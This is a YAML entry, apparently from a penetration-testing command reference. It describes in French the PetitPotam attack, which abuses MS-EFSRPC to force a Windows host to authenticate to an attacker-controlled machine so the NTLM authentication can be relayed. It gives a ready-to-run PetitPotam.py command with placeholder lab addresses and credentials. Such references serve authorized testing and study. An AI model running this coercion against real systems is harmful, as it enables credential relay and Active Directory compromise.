---
description: |
  PetitPotam exploite l'API MS-EFSRPC pour se connecter à un hôte Windows, détourner la session d'authentification et déclencher une authentification de l'hôte cible vers un hôte contrôlé par l'attaquant (généralement un serveur SMB ou HTTP). Cette authentification capturée peut ensuite être relayée pour authentifier d'autres hôtes et effectuer d'autres attaques. Plus d'informations dans ntlmrelayx.py.

  Command Reference:

  	Target IP: 10.10.10.1

  	Attacker IP: 10.10.10.2

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
items:
  - Password
  - Username
services:
  - RPC
  - NTLM
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/topotam/PetitPotam
  - https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
---
